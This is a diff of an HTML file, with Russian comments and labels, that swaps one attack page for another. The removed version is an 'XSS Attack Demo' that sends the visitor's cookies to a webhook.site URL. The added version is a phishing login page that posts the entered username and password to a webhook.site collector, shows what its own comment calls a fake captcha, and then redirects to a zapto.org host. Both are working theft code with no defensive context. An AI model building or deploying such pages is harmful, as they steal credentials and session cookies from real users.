@@ -1,18 +1,35 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8">
-    <title>XSS Attack Demo</title>
-    <script>
-      // Отправка cookie на Webhook
-      fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + document.cookie)
-        .then(() => {
-          // Перенаправление на любой сайт (можно на kazcyber.zapto.org)
-          window.location.href = "https://example.com";
-        });
-    </script>
-  </head>
-  <body>
-    <h1>Загрузка...</h1>
-  </body>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Вход в систему</title>
+  <link rel="stylesheet" href="https://kazcyber.zapto.org/css/style.css">
+</head>
+<body>
+
+<div class="auth-container">
+  <h2>Войти в систему</h2>
+  <form method="POST" action="https://webhook.site/81c5985c-c290-476c-9931-81c3fb8328ab" id="loginForm">
+    <input type="text" name="username" placeholder="Логин" required><br>
+    <input type="password" name="password" placeholder="Пароль" required><br>
+
+    <!-- Фейковая капча -->
+    <div class="g-recaptcha" data-sitekey="6Ld_q0UrAAAAADc3t0ns6sob56ZAz5ikcUahqrv1"></div>
+
+    <button type="submit">Войти</button>
+  </form>
+</div>
+
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+<!-- Автоматический редирект после отправки -->
+<script>
+  document.getElementById("loginForm").addEventListener("submit", function() {
+    setTimeout(function() {
+      window.location.href = "https://kazcyber.zapto.org/index.php";
+    }, 1000); // подождать 1 секунду
+  });
+</script>
+
+</body>
 </html>
